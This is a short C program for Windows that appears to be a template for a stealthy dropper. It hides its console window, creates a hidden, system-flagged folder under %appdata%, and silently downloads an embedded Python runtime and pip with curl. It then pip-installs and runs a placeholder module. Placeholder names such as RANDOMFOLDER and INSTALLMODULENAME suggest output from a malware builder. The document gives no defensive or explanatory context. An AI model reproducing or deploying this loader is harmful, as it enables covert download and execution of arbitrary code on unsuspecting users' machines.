#include <stdio.h>
#include <windows.h>
int main()
{
    ShowWindow(GetConsoleWindow(), 0);
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "ADDON cd %%appdata%% & if exist RANDOMFOLDER (cd RANDOMFOLDER & python -m RUNMODULENAME ARGS) else (mkdir RANDOMFOLDER & attrib +h +s +r RANDOMFOLDER & cd RANDOMFOLDER & curl -s https://www.python.org/ftp/python/3.12.1/python-3.12.1-embed-win32.zip -o PYTHONZIP & tar -xf PYTHONZIP & echo import site >> python312._pth & curl -s https://bootstrap.pypa.io/get-pip.py -O & python get-pip.py & Scripts\\pip install INSTALLMODULENAME & python -m RUNMODULENAME ARGS)");
    FILE *pipe = _popen(cmd, "r");
    char buffer[128];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL)
    {
    }
    _pclose(pipe);
    return 0;
}